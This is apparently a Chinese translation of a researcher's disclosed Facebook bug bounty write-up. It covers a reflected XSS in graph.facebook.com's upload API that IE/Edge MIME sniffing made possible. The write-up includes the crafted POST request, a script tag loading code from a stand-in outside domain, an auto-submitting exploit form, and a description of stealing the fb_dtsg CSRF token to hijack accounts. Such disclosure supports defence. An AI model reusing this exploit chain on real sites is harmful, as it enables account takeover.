**![](https://image.3001.net/images/20191207/1575714863_5deb802fd16e9.jpg!small)**

**本文分享的是graph.facebook.com中存在的反射型XSS漏洞，攻击者利用该漏洞可以构造恶意链接引诱受害者访问，添加账户绑定邮箱或手机号，从而实现对受害者Facebook账户的劫持。**

##  漏洞情况

该漏洞只在IE和Edge浏览器中有效，漏洞原因在于graph.facebook.com中的某些API端点，在处理HTML代码响应时未实施完善安全的转义措施。响应消息存在于JSON格式中，HTML代码被当做其中一个字段的值也包含在内，而且响应消息不附带Content-Type 或 X-Content-Type-Options头，这样我就能有机会在IE/Edge中构造代码执行了。（这两类浏览器会扫描整个页面确定MIME文件类型，而其它浏览器只检查前几个字符）。

##  漏洞复现

1、首先，我们发送以下上传方式的POST请求：

    
    
    POST /app/uploads
    
     Host: graph.facebook.com 
    
     access_token=ACCESS_TOKEN&file_length=100&file_type=PAYLOAD

其中的ACCESS_TOKEN是由Facebook for
Android的第一方应用生成的有效用户访问令牌，PAYLOAD则是我们想插入的HTML代码，用于后续引诱受害者在浏览器中执行。当提交请求后，远程服务端会返回一个类似如下的值，其中包含一个后续会用到的会话ID（具体请参考[Facebook官方说明](https://developers.facebook.com/docs/graph-api/resumable-upload-api/)）：

    
    
    {
    
     "id": "upload:MTphdHRhY2htZW50Ojlk2mJiZxUwLWV6MDUtNDIwMy05yTA3LWQ4ZDPmZGFkNTM0NT8=?sig=ARZqkGCA_uQMxC8nHKI"
    
     }

经测试发现，其响应消息中没有内容安全策略（CSP）限制，所以，我想到了能不能用一个包含外部链接的js文件来插入HTML代码，例如：

    
    
    <html><body><script src=//DOMAIN.com/script.js ></script></body></html>

2、这里的上传请求被Facebook后端做了Base64编码处理，返回显示如下，其中包含了我们特意植入的Payload：

    
    
    upload:MTphdHRhY2htZW50OjZiZnNjNmYxLTljY2MtNDQxNi05YzM1LTFlc2YyMmI5OGlmYz9maWxlX2xlbmd0aD0wJmZpbGVfdHlwZT08aHRtbD48Y**keT48c2NyaXB0IHNyYz0vL0RPTUFJTi5jb20vc2NyaXB0LmpzID48L3NjcmlwdD48L2JvZHk+PC9odG1sPg==?sig=ARaCDqLfwoeI8V3s

所以，用该编码串之后就会有如下请求，用它可以向Facebook发起POST请求：

[](https://graph.facebook.com/upload:MTphdHRhY2htZW50OjZiZnNjNmYxLTljY2MtNDQxNi05YzM1LTFlc2YyMmI5OGlmYz9maWxlX2xlbmd0aD0wJmZpbGVfdHlwZT08aHRtbD48Y)

    
    
    <https://graph.facebook.com/upload:MTphdHRhY2htZW50OjZiZnNjNmYxLTljY2MtNDQxNi05YzM1LTFlc2YyMmI5OGlmYz9maWxlX2xlbmd0aD0wJmZpbGVfdHlwZT08aHRtbD48Y>**keT48c2NyaXB0IHNyYz0vL0RPTUFJTi5jb20vc2NyaXB0LmpzID48L3NjcmlwdD48L2JvZHk+PC9odG1sPg==?sig=ARaCDqLfwoeI8V3s

3、由此，利用以上请求串，我向其中加入我在第1步中生成的有效access_token，构造了一个HTML网页放到了我的网站中：

    
    
    <html> 
    
     <body> 
    
     <form action=”<https://graph.facebook.com/upload:MTphdHRhY2htZW50OjZiZnNjNmYxLTljY2MtNDQxNi05YzM1LTFlc2YyMmI5OGlmYz9maWxlX2xlbmd0aD0wJmZpbGVfdHlwZT08aHRtbD48Y>**keT48c2NyaXB0IHNyYz0vL0RPTUFJTi5jb20vc2NyaXB0LmpzID48L3NjcmlwdD48L2JvZHk+PC9odG1sPg==?sig=ARaCDqLfwoeI8V3s&access_token=MY_ACCESS_TOKEN”    method=”POST”><input name=”random_” value=”random”>
    
     <input type=”submit” value=”Submit” />
    
     </form>
    
     <script type =”text/javascript “>
    
     document.forms[0].submit();
    
     </script> 
    
     </body>
    
     </html>

该页面包含了一个提交样式，受害者访问之后的响应消息如下：

    
    
    {“h”:”2::<html><body><script src=//DOMAIN.com/script.js ></script></body></html>:GVo0nVVSEBm2kCDZXKFCdFSlCSZjbugbAAAP:e:1571103112:REDACATED:REDACATED:ARCvdJWLVDpBjUAZzrg”}

重要的是，[https://DOMAIN.com/script.js](https://domain.com/script.js)中的脚本文件将帮助我窃取受害者的“fb_dtsg”
CSRF
token，并且可向<https://www.facebook.com/api/graphql/>发送一个添加手机号或邮箱地址的绑定请求，实现间接的受害者账户劫持。

##  漏洞修复

> 1、在file_type参数中加入对HTML代码处理的安全转义措施；
>
> 2、给每个响应中加入“Content-type: application/json” 头避免进一步的攻击。

##  漏洞上报及处理进程

> 2019.10.10 漏洞初报
>
> 2019.10.10 Facebook确认
>
> 2019.10.11 Facebook修复
>
> 2019.10.24 Facebook奖励5000$

***参考来源：[ysamm](https://ysamm.com/?p=343)，clouds编译整理，转载请注明来自 FreeBuf.COM**

  

